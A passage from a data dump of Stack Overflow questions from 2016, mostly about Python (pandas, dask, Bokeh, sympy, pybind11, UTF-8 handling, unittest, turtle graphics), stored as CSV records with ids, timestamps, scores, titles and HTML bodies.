elem = driver.find_element_by_name(""q"")
elem.clear()
elem.send_keys(""pycon"")
elem.send_keys(Keys.RETURN)
assert ""No results found."" not in driver.page_source
driver.close()
</code></pre>

<p>Any help would be appreciated</p>

<p>PS : firefox version 49
selenium version 2.53.6
python 3.5</p>
"
39711422,5405545.0,2016-09-26 20:02:07+00:00,3,Getting percentages after binning pandas dataframe,"<p>Based on the following mock DF:</p>

<pre><code>df = pd.DataFrame({'State': {0: ""AZ"", 1: ""AZ"", 2:""AZ"", 3: ""AZ"", 4: ""AK"", 5: ""AK"", 6 : ""AK"", 7: ""AK""},
                 '# of Boxes': {0: 1, 1: 2, 2:2, 3: 1, 4: 2, 5: 2, 6 : 1, 7: 2},
                 'Price': {0: 2, 1: 4, 2:15, 3: 25, 4: 17, 5: 13, 6 : 3, 7: 3}},
                 columns=['State', '# of Boxes', 'Price'])

print(df)
  State  # of Boxes  Price
0    AZ           1      2
1    AZ           2      4
2    AZ           2     15
3    AZ           1     25
4    AK           2     17
5    AK           2     13
6    AK           1      3
7    AK           2      3
</code></pre>

<p>I want to bin the Prices as (0, 15], (15, 30], then get the % of the total by box, by state.</p>

<pre><code>State    Box    Price (0,15]    Price (15,30]
 AZ      1        .5             .5
 AZ      2        1              0
 AK      1        1              0
 AK      2        .66            .33
</code></pre>

<p>I've tried pivoting using an agg function but I can't seem to figure it out.</p>

<p>Thank you!</p>
"
39711335,6689610.0,2016-09-26 19:57:24+00:00,3,Python - Reading a UTF-8 encoded string byte-by-byte,"<p>I have a device that returns a UTF-8 encoded string. I can only read from it byte-by-byte and the read is terminated by a byte of value 0x00.</p>

<p>I'm making a Python 2.7 function for others to access my device and return string.</p>

<p>In a previous design when the device just returned ASCII, I used this in a loop:</p>

<pre><code>x = read_next_byte()
if x == 0:
    break
my_string += chr(x)
</code></pre>

<p>Where x is the latest byte value read from the device.</p>

<p>Now the device can return a UTF-8 encoded string, but I'm not sure how to convert the bytes that I get back into a UTF-8 encoded string/unicode. </p>

<p><code>chr(x)</code> understandably causes an error when the x>127, so I thought that using <code>unichr(x)</code> may work, but that assumes the value passed is a full unicode character value, but I only have a part 0-255.</p>

<p>So how can I convert the bytes that I get back from the device into a string that can be used in Python and still handle the full UTF-8 string?</p>

<p>Likewise, if I was given a UTF-8 string in Python, how would I break that down into individual bytes to send to my device and still maintain UTF-8?</p>
"
40113552,200317.0,2016-10-18 16:32:01+00:00,3,Pandas: Create another column while splitting each row from the first column,"<p>Goal create a second column from the first column</p>

<pre><code>column1, column2
Hello World, #HelloWord
US Election, #USElection
</code></pre>

<p>I have a simple file that has a one column</p>

<pre><code>columnOne
Hello World
US Election
Movie Night
</code></pre>

<p>I wrote following function</p>

<pre><code>&gt;&gt;&gt; def newColumn(row):
...     r = ""#"" + """".join(row.split("" ""))
...     return r
</code></pre>

<p>then I did following to create the second column using pandas</p>

<pre><code>df['column2'] = df.apply (lambda row: newColumn(row),axis=1)
</code></pre>

<p>But I end up with following error: </p>

<pre><code>Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
  File ""/Users/anuradha_uduwage/anaconda2/lib/python2.7/site-packages/pandas/core/frame.py"", line 3972, in apply
    return self._apply_standard(f, axis, reduce=reduce)
  File ""/Users/anuradha_uduwage/anaconda2/lib/python2.7/site-packages/pandas/core/frame.py"", line 4064, in _apply_standard
    results[i] = func(v)
  File ""&lt;stdin&gt;"", line 1, in &lt;lambda&gt;
  File ""&lt;stdin&gt;"", line 2, in newColumn
  File ""/Users/anuradha_uduwage/anaconda2/lib/python2.7/site-packages/pandas/core/generic.py"", line 2360, in __getattr__
    (type(self).__name__, name))
AttributeError: (""'Series' object has no attribute 'split'"", u'occurred at index 0')
</code></pre>

<p>so I change the split to following: </p>

<pre><code>r = """".join(row.str.split("" ""))
</code></pre>

<p>But that didn't help</p>
"
39997840,1474847.0,2016-10-12 11:48:19+00:00,3,C++ uses twice the memory when moving elements from one dequeue to another,"<p>In my project, I use <a href=""https://github.com/pybind/pybind11"" rel=""nofollow"">pybind11</a> to bind C++ code to Python. Recently I have had to deal with very large data sets (70GB+) and encountered need to split data from one <code>std::deque</code> between multiple <code>std::deque</code>'s. Since my dataset is so large, I expect the split not to have much of memory overhead. Therefore I went for one pop - one push strategy, which in general should ensure that my requirements are met. </p>

<p>That is all in theory. In practice, my process got killed. So I struggled for past two days and eventually came up with following minimal example demonstrating the problem.</p>

<p>Generally the minimal example creates bunch of data in <code>deque</code> (~11GB), returns it to Python, then calls again to <code>C++</code> to move the elements. Simple as that. Moving part is done in executor.</p>

<p>The interesting thing is, that if I don't use executor, memory usage is as expected and also when limits on virtual memory by ulimit are imposed, the program really respects these limits and doesn't crash.</p>

<p><strong>test.py</strong></p>

<pre><code>from test import _test
import asyncio
import concurrent

async def test_main(loop, executor):
    numbers = _test.generate()
    # moved_numbers = _test.move(numbers) # This works!
    moved_numbers = await loop.run_in_executor(executor, _test.move, numbers) # This doesn't!

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    executor = concurrent.futures.ThreadPoolExecutor(1)

    task = loop.create_task(test_main(loop, executor))
    loop.run_until_complete(task)

    executor.shutdown()
    loop.close()
</code></pre>

<p><strong>test.cpp</strong></p>

<pre><code>#include &lt;deque&gt;
#include &lt;iostream&gt;
#include &lt;pybind11/pybind11.h&gt;
#include &lt;pybind11/stl.h&gt;

namespace py = pybind11;

PYBIND11_MAKE_OPAQUE(std::deque&lt;uint64_t&gt;);
PYBIND11_DECLARE_HOLDER_TYPE(T, std::shared_ptr&lt;T&gt;);

template&lt;class T&gt;
void py_bind_opaque_deque(py::module&amp; m, const char* type_name) {
    py::class_&lt;std::deque&lt;T&gt;, std::shared_ptr&lt;std::deque&lt;T&gt;&gt;&gt;(m, type_name)
    .def(py::init&lt;&gt;())
    .def(py::init&lt;size_t, T&gt;());
}

PYBIND11_PLUGIN(_test) {
    namespace py = pybind11;
    pybind11::module m(""_test"");
    py_bind_opaque_deque&lt;uint64_t&gt;(m, ""NumbersDequeue"");

    // Generate ~11Gb of data.
    m.def(""generate"", []() {
        std::deque&lt;uint64_t&gt; numbers;
        for (uint64_t i = 0; i &lt; 1500 * 1000000; ++i) {
            numbers.push_back(i);
        }
        return numbers;
    });

    // Move data from one dequeue to another.
    m.def(""move"", [](std::deque&lt;uint64_t&gt;&amp; numbers) {
        std::deque&lt;uint64_t&gt; numbers_moved;

        while (!numbers.empty()) {
            numbers_moved.push_back(std::move(numbers.back()));
            numbers.pop_back();
        }
        std::cout &lt;&lt; ""Done!\n"";
        return numbers_moved;
    });

    return m.ptr();
}
</code></pre>

<p><strong>test/__init__.py</strong></p>

<pre><code>import warnings
warnings.simplefilter(""default"")
</code></pre>

<p><strong>Compilation</strong>:</p>

<pre><code>g++ -std=c++14 -O2 -march=native -fPIC -Iextern/pybind11 `python3.5-config --includes` `python3.5-config --ldflags` `python3.5-config --libs` -shared -o test/_test.so test.cpp
</code></pre>

<p><strong>Observations:</strong></p>

<ul>
<li>When the moving part is not done by executor, so we just call <code>moved_numbers = _test.move(numbers)</code>, all works as expected, memory usage showed by htop stays around <code>11Gb</code>, great!.</li>
<li>When moving part is done in executor, the program takes double the memory and crashes.</li>
<li><p>When limits on virtual memory are introduced (~15Gb), all works fine, which is probably the most interesting part.</p>

<p><code>ulimit -Sv 15000000 &amp;&amp; python3.5 test.py</code> >> <code>Done!</code>.</p></li>
<li><p>When we increase the limit the program crashes (150Gb > my RAM).</p>

<p><code>ulimit -Sv 150000000 &amp;&amp; python3.5 test.py</code> >> <code>[1]    2573 killed     python3.5 test.py</code></p></li>
<li><p>Usage of deque method <code>shrink_to_fit</code> doesn't help (And nor it should)</p></li>
</ul>

<p><strong>Used software</strong></p>

<pre><code>Ubuntu 14.04
gcc version 5.4.1 20160904 (Ubuntu 5.4.1-2ubuntu1~14.04)
Python 3.5.2
pybind11 latest release - v1.8.1
</code></pre>

<p><strong>Note</strong></p>

<p>Please note that this example was made merely to demonstrate the problem. Usage of <code>asyncio</code> and <code>pybind</code> is necessary for problem to occur.  </p>

<p>Any ideas on what might be going on are most welcomed.</p>
"
39736575,2845174.0,2016-09-28 01:17:56+00:00,3,Is it possible to overload the ~ operator on strings?,"<pre><code>&gt;&gt;&gt; a = 55
&gt;&gt;&gt; b = ""hello""
&gt;&gt;&gt; ~a  # this will work
&gt;&gt;&gt; ~b  # this will fail
</code></pre>

<p>No real surprise for the failure above, but suppose I wanted to overload ~ operator to work on strings. I'm fairly new to Python, so I did some digging on this and found a few tantalizing suggestions that I just couldn't get working. I know I can create some kind of new class, but I'd like the following to work as well:</p>

<pre><code>&gt;&gt;&gt; ~""alpha bravo""
</code></pre>

<p>Is this possible? If so, how? How does one do this kind of overload?</p>
"
40051914,6728318.0,2016-10-14 21:01:06+00:00,3,a mistake I keep having with for loops and return statements,"<p>I have been noticing a problem I am having whenever I try to make a function that takes changes a string or a list then returns it. </p>

<p>I will give you an example of this happening with a code I just wrote:</p>

<pre><code>def remove_exclamation(string):
string.split(' ')
for i in string:
    i.split()
    for char in i:
        if char == '!':
            del char
            ''.join(i)
            ' '.join(string)
return string
</code></pre>

<p>For instance, I create this code to take a string as its parameter, remove any exclamation in it, the return it changed. The input and output should look like this:</p>

<pre><code>&gt;&gt;&gt;remove_exclamation('This is an example!')
'This is an example'
</code></pre>

<p>But instead I get this:</p>

<pre><code>&gt;&gt;&gt;remove_exclamation('This is an example!')
'This is an example!'
</code></pre>

<p>The function is not removing the exclamation in the output, and is not doing what I intended for it to day.</p>

<p>How can I keep avoiding this when I make for loops, nested for loops etc?</p>
"
39796519,6905665.0,2016-09-30 17:00:50+00:00,3,How would I count the number of days based on months with zero data?,"<p>I'm writing a script in which I read in a csv with several columns and rows. I need the script to total the values in each column for a single row and return which columns have a value of zero for the row. Here's an example of what the data looks like, there are several other columns but these are the columns of interest for my question:</p>

<pre><code>    JAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC
     0   0   5   5   0   5   5   5   5   0   0   0
</code></pre>

<p>this is what I have so far:</p>

<pre><code>    import pandas as pd
    import os

    os.chdir('C:\\users\\vroland\\desktop\\RR_WMD\\WUdata')

    fout=open(""WUinput.csv"",""a"")
    #read water use file
    df=pd.read_csv(""WUtest.csv"")
    #Header &amp; months with zero values
    cols=df.columns
    #Boolean array of columns with zero values
    bt=df.apply(lambda x: x==0)
    #List months with zero values
    zar=bt.apply(lambda x:list(cols[x.values]),axis=1)
</code></pre>

<p>I've tried a combination of ways including <code>if</code> statements, but i keep getting an error stating my conditional statement is ambiguous so I'm trying another route. So this is what i have now to go along with the block of code above:</p>

<pre><code>   a=30
   b=31
   c=28
   num_days=pd.DataFrame({'JAN':[b],'FEB':[c],'MAR':[b],'APR':[a],'MAY':[b],
                          'JUN':[a],'JUL':[b],'AUG':[b],'SEP':[a],'OCT':[b],
                          'NOV':[a],'DEC':[b]})
</code></pre>

<p>The idea is to use the values returned in <code>zar</code> to look up the appropriate day value in my data frame <code>num_days</code>. Return this value and calculate the total number of days with a value of zero. </p>
"
39630773,6568309.0,2016-09-22 05:16:42+00:00,3,"Django, How does models.py under auth folder create initial tables when you migrate very first time?","<p>If you migrate very first time after making new project in Django, you can find that Django creates tables like below.</p>

<pre><code>auth_group
auth_group_permissions
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
django_admin_log
django_content_type
django_migrations
django_session
</code></pre>

<p>Now I learned that those tables are created because lines under INSTALLED_APPS in settings.py.</p>

<pre><code>INSTALLED_APPS = [
'django.contrib.admin',
'django.contrib.auth',
'django.contrib.contenttypes',
'django.contrib.sessions',
'django.contrib.messages',
'django.contrib.staticfiles',
]
</code></pre>

<p>so I started to look into models.py under auth folder(in Django folder where I installed). I expected that there would be six classes in models.py. Because I learned that Class turn to table thanks to ORM(Ojbejct Relation Mapping).</p>

<pre><code>auth_group
auth_group_permissions 
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
</code></pre>

<p>I could find class named 'Permission', a class named 'Group' and a class named 'User' in models.py under auth folder. I think those made tables 'auth_permission', 'auth_group' and 'auth_user'. Then what about other?(auth_group_permissions, auth_user_groups, auth_user_user_permissions) I would like to understand how those tables are created by Django(models.py in auth folder). Where should like look into in models.py to understand that?</p>

<p>I expect that I can understand how other tables are created(django_admin_log, django_content_type, django_migrations, django_session) if I can understand that. I will appreciate if you can also explain how Django creates tables named 'django_migrations' and 'django_session' too.</p>

<p>Thank you in advance. Have a nice day.
<a href=""http://i.stack.imgur.com/ExTVQ.png"" rel=""nofollow"">enter image tables showing in pgAdmin3</a></p>
"
39736901,6890826.0,2016-09-28 02:03:52+00:00,3,chcp 65001 codepage results in program termination without any error,"<p><strong>Problem</strong><br>
The problem arises when I want to <strong>input</strong> Unicode character in Python interpreter (for simplicity I have used a-umlaut in the example, but I have first encountered this for Farsi characters). Whenever I use python with <code>chcp 65001</code> code page and then try to input even one Unicode character, Python exits without any error.</p>

<p>I have spent days trying to solve this problem to no avail. But today, I found a thread on <a href=""https://bugs.python.org/issue1602"" rel=""nofollow"">python website</a>, another on <a href=""https://bugs.mysql.com/bug.php?id=66682"" rel=""nofollow"">MySQL</a> and another on Lua-users which issues were raised regarding this sudden exit, although without any solution and some saying that <code>chcp 65001</code> is inherently broken.</p>

<p>It would be good to know once and for all whether this problem is chcp-design-related or there is a possible workaround.</p>

<p><strong>Reproduce Error</strong></p>

<p><code>chcp 65001</code></p>

<blockquote>
  <p>Python 3.X:</p>
</blockquote>

<p>Python shell</p>

<p><code>print('Ã¤')</code></p>

<p>result: it just exits the shell</p>

<p><strong>however</strong>, this works <code>python.exe -c ""print('Ã¤')""</code>
and also this : <code>print('\u00e4')</code></p>

<p>result: Ã¤</p>

<blockquote>
  <p>in Luajit2.0.4</p>
</blockquote>

<p><code>print('Ã¤')</code></p>

<p>result: it just exits the shell</p>

<p>however this works: <code>print('\xc3\xa4')</code></p>

<p><strong>I have come up with this observation so far:</strong></p>

<ol>
<li>direct output with the command prompt works.</li>
<li>Unicode-based , hex-based equivalent of the character works.</li>
</ol>

<p><strong>So</strong>
  This is not a Python bug <strong>and</strong> that we can't use a Unicode character directly in CLI programs in Windows command prompt or any of its Wrapper like Conemu, Cmder (I am using Cmder to be able to see and use Unicode character in Windows shell and I have done so without any problem). Is this correct?</p>
"
39782955,4300257.0,2016-09-30 02:57:10+00:00,3,Hover tool not working in Bokeh,"<p>I have a table that contains the number of times a student accessed an activity.</p>

<pre><code>  df_act5236920.head()

    activities  studs
 0  3.0       student 1
 1  4.0       student 10
 2  5.0       student 11
 3  6.0       student 12
 4  2.0       student 13
 5  4.0       student 14
 6  19.0      student 15
</code></pre>

<p>If I try to add the hover tool to the bar chart created by this dataframe through the code below:</p>

<pre><code> from bokeh.charts import Bar
 from bokeh.models import Legend

 from collections import OrderedDict
 TOOLS = ""pan,wheel_zoom,box_zoom,reset,hover,save""
 bar = Bar(df_act5236920,values='activities',label='studs',title = ""Activity 5236920 performed by students"",
      xlabel=""Students"",ylabel=""Activity"",legend=False,tools=TOOLS)
 hover = bar.select_one(HoverTool)
 hover.point_policy = ""follow_mouse""
 hover.tooltips = OrderedDict([
     (""Student Name"", ""@studs""),
     (""Access Count"", ""@activities""),
 ])
 show(bar)
</code></pre>

<p>When I hover over the bar chart, it shows the student value but not the activities values, I even tried using ""$activities"" but the result is still the same.</p>

<p><a href=""http://i.stack.imgur.com/kne1z.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/kne1z.jpg"" alt=""enter image description here""></a></p>

<p>I tried using ColumnDataSource instead of DataFrame based on other stack overflow questions I read, as is apparent in the code below:</p>

<pre><code>source = ColumnDataSource(ColumnDataSource.from_df(df_act5236920))

from collections import OrderedDict
TOOLS = ""pan,wheel_zoom,box_zoom,reset,hover,save""
bar = Bar('studs','activities',source=source, title = ""Activity 5236920 performed by students"",tools=TOOLS)
hover = bar.select_one(HoverTool)
hover.point_policy = ""follow_mouse""
hover.tooltips = OrderedDict([
    (""Student Name"", ""@studs""),
    (""Access Count"", ""@activities""),
])
show(bar)
</code></pre>

<p>It gives me the following error:</p>

<pre><code>    ---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&lt;ipython-input-76-81505464c390&gt; in &lt;module&gt;()
  3 # bar = Bar(df_act5236920,values='activities',label='studs',title = ""Activity 5236920 performed by students"",
  4 # xlabel=""Students"",ylabel=""Activity"",legend=False,tools=TOOLS)
  ----&gt; 5 bar = Bar('studs','activities',source=source, title = ""Activity 5236920 performed by students"",tools=TOOLS)
  6 hover = bar.select_one(HoverTool)
  7 hover.point_policy = ""follow_mouse""

C:\Anaconda2\lib\site-packages\bokeh\charts\builders\bar_builder.pyc in  Bar(data, label, values, color, stack, group, agg, xscale, yscale, xgrid, ygrid, continuous_range, **kw)
319     kw['y_range'] = y_range
320 
--&gt; 321     chart = create_and_build(BarBuilder, data, **kw)
322 
323     # hide x labels if there is a single value, implying stacking only

C:\Anaconda2\lib\site-packages\bokeh\charts\builder.pyc in create_and_build(builder_class, *data, **kws)
 66     # create the new builder
 67     builder_kws = {k: v for k, v in kws.items() if k in builder_props}
---&gt; 68     builder = builder_class(*data, **builder_kws)
 69 
 70     # create a chart to return, since there isn't one already

C:\Anaconda2\lib\site-packages\bokeh\charts\builder.pyc in __init__(self, *args, **kws)
292             # make sure that the builder dimensions have access to the chart data source
293             for dim in self.dimensions:
--&gt; 294                 getattr(getattr(self, dim), 'set_data')(data)
295 
296             # handle input attrs and ensure attrs have access to data

C:\Anaconda2\lib\site-packages\bokeh\charts\properties.pyc in set_data(self, data)
170             data (`ChartDataSource`): the data source associated with the chart
171         """"""
--&gt; 172         self.selection = data[self.name]
173         self._chart_source = data
174         self._data = data.df

TypeError: 'NoneType' object has no attribute '__getitem__'
</code></pre>

<p>I even tried creating the ColumnDataSource from scratch by passing the columns of the dataframe to it in the form of a list of values, but I still got the same error as the one shown above</p>

<pre><code>source = ColumnDataSource(data=dict(
     studs=students,
     activities=activity_5236920,
))
</code></pre>

<p>I'm having the same issue when I try to implement the hovertool on a heatmap as well. Can anyone help in how to fix this?</p>
"
40052328,7021393.0,2016-10-14 21:33:12+00:00,3,Computing 3âââ3 (In Python),"<p>I'm giving a presentation on <a href=""https://en.wikipedia.org/wiki/Graham%27s_number"" rel=""nofollow"">Graham's Number</a> and I wanted to compute the first few âs (i.e. 3â3, 3ââ3, and 3âââ3) to give them an idea of how huge it gets in such a short time. I wrote some naive/direct code in python, based on the definitions of arrow notation, shown below:</p>

<pre><code>def arrow2(a,b):
    c=1
    for i in np.arange(b):
        c=a**c
    return c

def arrow3(a,b):
    c=1
    for i in np.arange(b):
        c=arrow2(a,c)
    return c
</code></pre>

<p>Although ""long"" integers (limitless) and numpy arrays (limitless) were used, naturally the code takes up far too much memory while running and will take a very long time to process. Is there a solution to this? (or does someone already know the answer?) Thank you!</p>
"
40052981,4596596.0,2016-10-14 22:40:57+00:00,3,How to execute a multi-threaded `merge()` with dask? How to use multiples cores via qsub?,"<p>I've just begun using dask, and I'm still fundamentally confused how to do simple pandas tasks with multiple threads, or using a cluster. </p>

<p>Let's take <code>pandas.merge()</code> with <code>dask</code> dataframes. </p>

<pre><code>import dask.dataframe as dd

df1 = dd.read_csv(""file1.csv"")
df2 = dd.read_csv(""file2.csv"")

df3 = dd.merge(df1, df2)
</code></pre>

<p>Now, let's say I were to run this on my laptop, with 4 cores. How do I assign 4 threads to this task?</p>

<p>It appears the correct way to do this is:</p>

<pre><code>dask.set_options(get=dask.threaded.get)
df3 = dd.merge(df1, df2).compute()
</code></pre>

<p>And this will use as many threads exist (i.e. as many cores with shared memory on your laptop exist, 4)? How do I set the number of threads?</p>

<p>Let's say I am at a facility with 100 cores. How do I submit this in the same manner as one would submit jobs to the cluster with <code>qsub</code>? (Similar to running tasks on clusters via MPI?)</p>

<pre><code>dask.set_options(get=dask.threaded.get)
df3 = dd.merge(df1, df2).compute
</code></pre>
"
39737712,5160708.0,2016-09-28 03:49:02+00:00,3,Get Attributes python,"<pre><code>class A(object):
      a = 1
      b = 0
      c = None
      d = None
a_obj=A()
a_list = ['a', 'b', 'c', 'd']
attrs_present = filter(lambda x: getattr(a_obj, x), a_list)
</code></pre>

<p>I want both a and b attributes, here 0 is a valid value. I don't want to use comparison==0</p>

<p>is there a way to get those?
Any help will be appriciated, Thanks.</p>
"
39631386,6858968.0,2016-09-22 06:04:04+00:00,3,How to understand this raw HTML of Yahoo! Finance when retrieving data using Python?,"<p>I've been trying to retrieve stock price from Yahoo! Finance, like for <a href=""http://finance.yahoo.com/quote/AAPL/profile?p=AAPL"" rel=""nofollow"">Apple Inc.</a>. My code is like this:(using Python 2)</p>

<pre><code>import requests
from bs4 import BeautifulSoup as bs

html='http://finance.yahoo.com/quote/AAPL/profile?p=AAPL'
r = requests.get(html)
soup = bs(r.text)
</code></pre>

<p>The problem is when I see raw HTML behind this webpage, the class is dynamic, see figure below. This makes it hard for BeautifulSoup to get tags. How to understand the class and how to get data?</p>

<p><a href=""http://i.stack.imgur.com/bITK0.png"" rel=""nofollow"">HTML of Yahoo! Finance page</a></p>

<p>PS: 1) I know pandas_datareader.data, but that's for historical data. I want the real-time stock data;</p>

<p>2) I don't want to use selenium to open a new browser window.</p>
"
39753441,6894321.0,2016-09-28 16:53:51+00:00,3,Symbolic integration of Modified Bessel Functions using sympy and Mathematica,"<p>I would like to use <code>sympy</code> to solve a definite integral that I know that Mathematica can solve. In Mathematica the following line </p>

<pre><code>Integrate[z^2 (BesselI[0, z^2] - BesselI[1, z^2]) Exp[-z^2], {z, 0, x}]
</code></pre>

<p>yields</p>

<pre><code>1/3 x^3 HypergeometricPFQ[{1/2,3/2},{1,5/2},-2 x^2]-1/10 x^5 HypergeometricPFQ[{3/2,5/2},{3,7/2},-2 x^2]
</code></pre>

<p>It would prefer to use <code>python</code> with <code>sympy</code> for this and I try to with the following code</p>

<pre><code>import sympy;
x, z = sympy.var('x z');
sympy.integrate( z**2*(sympy.besseli(0,z**2)-sympy.besseli(1,z**2))*sympy.exp(-z**2) ,(z,0,x));
</code></pre>

<p>Unfortunately, the computation just hangs. I give up after about 30-40 minutes of waiting. In Mathematica, it takes less than a second. If I change the integrand, then I can get <code>sympy</code> to solve it. Such as   </p>

<pre><code>sympy.integrate( z**2*sympy.besseli(0,z**2) ,(z,0,x));  
</code></pre>

<p>yields </p>

<pre><code>x**3*gamma(3/4)*hyper((3/4,), (1, 7/4), -x**4/4)/(4*gamma(7/4))
</code></pre>

<p>I am a long time Mathematica user and have a pretty good sense of how to get it to solve tricky integrals. As a new <code>sympy</code> users I lack that experience. </p>

<ul>
<li>Are there any flags I could add? </li>
<li>Are there other ways to solve this problem in <code>sympy</code>?</li>
<li>If this integral is not possible with <code>sympy</code>, is there a way to understand sympy's limitations? Such as how <code>sympy</code> does integration versus Mathematica.  </li>
</ul>
"
40016431,5453723.0,2016-10-13 08:53:32+00:00,3,Extract weight of an item from its description using regex in python,"<p>I have a list of product descriptions. for example:</p>

<pre><code> items = ['avuhovi Grillikaapeli 320g','Savuhovi Kisamakkara 320g',
'Savuhovi Raivo 250g', 'AitoMaku str.garl.sal.dres.330ml', 'Rydbergs
 225ml Hollandaise sauce']
</code></pre>

<p>I want to extract the weights that is, 320g, 320g, 250ml, 330ml. I know we can use regex for this but do not know how to buil regex to extract that. You can see that weights are sometimes in the middle of the description and sometimes having dot(.) as separator rather than space. So, I am confused how to extract.</p>

<p>Thanks for help in advance :)</p>
"
39764652,6777053.0,2016-09-29 08:03:04+00:00,3,Merging 2 dataframe using similar columns,"<p>I have 2 dataframe listed as follow</p>

<p>df</p>

<pre><code> Type       Breed     Common Color  Other Color  Behaviour
 Golden      Big           Gold          White        Fun      
 Corgi      Small          Brown         White       Crazy
 Bulldog    Medium         Black         Grey        Strong
</code></pre>

<p>df2</p>

<pre><code> Type              Breed    Behaviour   Bark Sound
 Pug               Small      Sleepy          Ak
 German Shepard    Big        Cool            Woof
 Puddle            Small      Aggressive      Ek
</code></pre>

<p>I wanted to merge 2 dataframe by columns <code>Type</code>, <code>Breed</code> and <code>Behavior</code>.</p>

<p>Therefore, my desire output would be:</p>

<pre><code>Type           Breed      Behavior
Golden          Big         Fun
Corgi           Small       Crazy  
Bulldog         Medium      Strong
Pug             Small       Sleepy
German Shepard  Big         Cool
Puddle          Small       Aggressive
</code></pre>
"
39804375,1472064.0,2016-10-01 08:07:57+00:00,3,Python - Sort a list of dics by value of dict`s dict value,"<p>I have a list that looks like this:</p>

<pre><code>persons = [{'id': 11, 'passport': {'id': 11, 'birth_info':{'date': 10/10/2016...}}},{'id': 22, 'passport': {'id': 22, 'birth_info':{'date': 11/11/2016...}}}]
</code></pre>

<p>I need to sort the list of persons by their sub key of sub key - their birth_info date.</p>

<p>How should I do it ?
Thanks</p>
"
40016192,6780053.0,2016-10-13 08:42:23+00:00,3,Inverting large JSON dictionary,"<p>I have a JSON dictionary containing multiple entries (roughly 8 million) of the following form:</p>

<pre><code>{""Some_String"": {""Name0"": 1, ""Name1"": 1, ""Name42"": 2, ""Name5"": 2, ... }, ...}
</code></pre>

<p>It contains strings that have been used to reference discrete named entities along with counts of how many times that name has been referenced by that string.</p>

<p>I want to invert the mapping so that the Name0 is followed by the strings that have referenced it (maintaining the counts). A name is likely to appear within multiple string entries. </p>

<pre><code>{""Name0"": {""Some_String"": 1, ""Some_other_string"": 1,... }, ...}
</code></pre>

<p>My question is: is there some JSON functionality that will allow me to efficiently do this?</p>

<p>My naive approach involves adding each name into a 2D array (adding the strings and counts to that array as they are found). </p>

<p>Initially this ran quite quickly, but as the size of the array increases the running time decreases (linear search). </p>

<pre><code>for string in list(surface.keys()):

    for count, name in zip(surfacs[string].values(),surface[string].keys()):

        if name in pages:
            surface_count_list[pages.index(name)].append([string, count])


        else:
            pages.append(name)
            surface_count_list.append([string, count])
</code></pre>

<p>I realise I could add this data directly into a new dictionary, but I didn't know if this would really increase the efficiency of adding new items as the size of the dictionary increases. </p>

<p>Thanks. </p>
"
39715910,6186122.0,2016-09-27 04:20:31+00:00,3,Trying to create a pandas series within a dataframe with values based on whether or not keys are in another dataframe,"<p>Boiling it down simply...</p>

<p>Dataframe 1 = yellow_fruits
The columns are fruit_name, and location</p>

<p>Dataframe 2 = red_fruits
The columns are fruit_name, and location</p>

<p>Dataframe 3 = fruit_montage
The columns are fruit_name, pounds_of_fruit_needed, freshness</p>

<p>Let's say I want to add a column to Dataframe 3 called 'color.'  The value will be yellow if the fruit is yellow, red if the fruit is red, and unknown if it's not red or yellow.</p>

<p>Basically, pseudocode...</p>

<p>If the fruit is in the yellow fruit dataframe, yellow goes in the column
If the fruit is in the red fruit dataframe, red goes in the column
If the fruit is not in either of those dataframes, 'unknown' goes in the column.</p>

<p>My code produced an error:</p>

<pre><code> if df3['fruit_name'].isin(df1['fruit_name']):
        data = ""'yellow""
    elif df3['fruit_name'].isin(df2['fruit_name']):
        data = ""red""
    else:
        data = ""unknown""

    df3['color'] = pd.Series(data, index = df3.index)
</code></pre>

<p>The error:</p>

<p>C:\Anaconda2\lib\site-packages\pandas\core\generic.pyc in <strong>nonzero</strong>(self)
    890         raise ValueError(""The truth value of a {0} is ambiguous. ""
    891                          ""Use a.empty, a.bool(), a.item(), a.any() or a.all().""
--> 892                          .format(self.<strong>class</strong>.<strong>name</strong>))
    893 
    894     <strong>bool</strong> = <strong>nonzero</strong></p>

<p>ValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all().</p>
"
40049036,41241.0,2016-10-14 17:40:28+00:00,3,Prevent GIL from being released,"<p>I'm attempting to call into the python interpreter from C.  This is working properly, but the python code that is being run is releasing the GIL, allowing other threads to proceed, but I want the python code to execute atomically.  Is there a way to prevent the GIL from being released?</p>
"
39715354,6873209.0,2016-09-27 03:05:12+00:00,3,How to put if and then statements while creating snowflakes in python,"<p>--im a beginner ..so im not sure how to make sure that the snowflakes don't overlap. Thanks!</p>

<pre><code>import turtle

turtle.right(90)

turtle.penup()

turtle.goto(-700,300)

turtle.pendown()

def snowflakebranch(n):

    turtle.forward(n*4)
    for i in range(3):
        turtle.backward(n)
        turtle.right(45)
        turtle.forward(n)
        turtle.backward(n)
        turtle.left(90)
        turtle.forward(n)
        turtle.backward(n)
        turtle.right(45)

def snowflake(n):

    for i in range(8):
        snowflakebranch(n)
        turtle.backward(n)
        turtle.right(45)

import random

turtle.colormode(255)

turtle.tracer(0)

for i in range(35):

    r = random.randint(0, 255)
    g = random.randint(0, 255)
    b = random.randint(0, 255)
    turtle.color(r, g, b)
    x = random.randint(-500, 500)
    y = random.randint(-500, 500)
    d = random.randint(6, 16)
    snowflake(d)
    turtle.penup()
    turtle.goto(x, y)
    #turtle.forward(250)
    turtle.pendown()


    turtle.update()
</code></pre>
"
40120770,3843097.0,2016-10-19 01:50:34+00:00,3,How to write unittest for variable assignment in python?,"<p>This is in <code>Python 2.7</code>.  I have a class called <code>class A</code>, and there are some attributes that I want to throw an exception when being set by the user:</p>

<pre><code>myA = A()
myA.myattribute = 9   # this should throw an error
</code></pre>

<p>I want to write a <code>unittest</code> that ensures that this throws an error.  </p>

<p>After creating a test class and inheriting <code>unittest.TestCase</code>, I tried to write a test like this:</p>

<pre><code>myA = A()
self.assertRaises(AttributeError, eval('myA.myattribute = 9'))
</code></pre>

<p>But, this throws a <code>syntax error</code>.  However, if I try <code>eval('myA.myattribute = 9')</code>, it throws the attribute error, as it should.</p>

<p>How do I write a unittest to test this correctly?  </p>

<p>Thanks.</p>
"
39715227,6883912.0,2016-09-27 02:45:46+00:00,3,making a function that can take arguments in various shapes,"<p>Q1)
